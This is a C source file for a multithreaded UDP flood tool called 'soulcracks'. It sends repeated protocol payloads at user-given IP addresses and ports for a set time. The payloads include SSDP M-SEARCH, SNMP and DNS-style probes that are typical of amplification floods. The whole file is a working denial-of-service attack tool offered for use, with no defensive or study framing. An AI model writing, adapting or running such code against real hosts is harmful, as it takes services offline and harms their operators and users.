#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

void usage() {
    printf("Usage: ./soulcracks ip1 port1 time1 ip2 port2 time2 ... threads\n");
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
    int time;
};

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    char *payloads[] = {
        "\xd9\x00",
        "\x00\x00",
        "\x00\x00",
        "\x00\x00",
        "\x00\x00",
        "\x00\x00",
        "\xd9\x00\x00",
        "\xd9\x00\x00",
        "\xd9\x00\x00",
        "\xd9\x00\x00",
        "\xd9\x00\x00",
        "\xd9\x00\x00",
        "\x72\xfe\x1d\x13\x00\x00",
        "\x72\xfe\x1d\x13\x00\x00",
        "\x72\xfe\x1d\x13\x00\x00",
        "\x72\xfe\x1d\x13\x00\x00",
        "\x72\xfe\x1d\x13\x00\x00",
        "\x30\x3a\x02\x01\x03\x30\x0f\x02\x02\x4a\x69\x02\x03\x00\x00",
        "\x02\x00\x00",
        "\x0d\x0a\x0d\x0a\x00\x00",
        "\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00",
        "\x72\xfe\x1d\x13\x00\x00",
        "\x38\x64\xc1\x78\x01\xb8\x9b\xcb\x8f\x00\x00",
        "\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00",
        "\x30\x3a\x02\x01\x03\x30\x0f\x02\x02\x4a\x69\x02\x03\x00\x00",
        "\x01\x00\x00",
        "\x53\x4e\x51\x55\x45\x52\x59\x3a\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x41\x41\x41\x41\x41\x41\x3a\x78\x73\x76\x72\x00\x00",
        "\x4d\x2d\x53\x45\x41\x52\x43\x48\x20\x2a\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a\x48\x4f\x53\x54\x3a\x20\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x35\x3a\x31\x39\x30\x30\x0d\x0a\x4d\x41\x4e\x3a\x20\x22\x73\x73\x64\x70\x3a\x64\x69\x73\x63\x6f\x76\x65\x72\x22\x0d\x0a\x4d\x58\x3a\x20\x31\x0d\x0a\x53\x54\x3a\x20\x75\x72\x6e\x3a\x64\x69\x61\x6c\x2d\x6d\x75\x6c\x74\x69\x73\x63\x72\x65\x65\x6e\x2d\x6f\x72\x67\x3a\x73\x65\x72\x76\x69\x63\x65\x3a\x64\x69\x61\x6c\x3a\x31\x0d\x0a\x55\x53\x45\x52\x2d\x41\x47\x45\x4e\x54\x3a\x20\x47\x6f\x6f\x67\x6c\x65\x20\x43\x68\x72\x6f\x6d\x65\x2f\x36\x30\x2e\x30\x2e\x33\x31\x31\x32\x2e\x39\x30\x20\x57\x69\x6e\x64\x6f\x77\x73\x0d\x0a\x0d\x0a\x00\x00",
        "\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00",
        "\x30\x3a\x02\x01\x03\x30\x0f\x02\x02\x4a\x69\x02\x03\x00\x00",
        "\x53\x4e\x51\x55\x45\x52\x59\x3a\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x41\x41\x41\x41\x41\x41\x3a\x78\x73\x76\x72\x00\x00",
    };

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time;

    while (time(NULL) <= endtime) {
        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
            if (sendto(sock, payloads[i], strlen(payloads[i]), 0,
                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc < 5 || (argc - 2) % 3 != 0) {
        usage();
    }

    int thread_count = atoi(argv[argc - 1]); // Number of threads from last argument
    int attack_count = (argc - 2) / 3; // Number of attacks (IP, port, time triplets)

    pthread_t *thread_ids = malloc(thread_count * sizeof(pthread_t));
    struct thread_data *data = malloc(attack_count * sizeof(struct thread_data));

    printf("Starting %d attacks with %d threads\n", attack_count, thread_count);

    for (int i = 0; i < attack_count; i++) {
        data[i].ip = argv[1 + i * 3];
        data[i].port = atoi(argv[2 + i * 3]);
        data[i].time = atoi(argv[3 + i * 3]);

        printf("Configured attack on %s:%d for %d seconds\n", data[i].ip, data[i].port, data[i].time);
    }

    for (int i = 0; i < thread_count; i++) {
        int attack_idx = i % attack_count; // Distribute threads across attacks
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&data[attack_idx]) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            free(data);
            exit(1);
        }
        printf("Launched thread with ID: Soulcracks %lu for attack %d\n", thread_ids[i], attack_idx);
    }

    for (int i = 0; i < thread_count; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    free(data);
    printf("All attacks finished\n");
    return 0;
}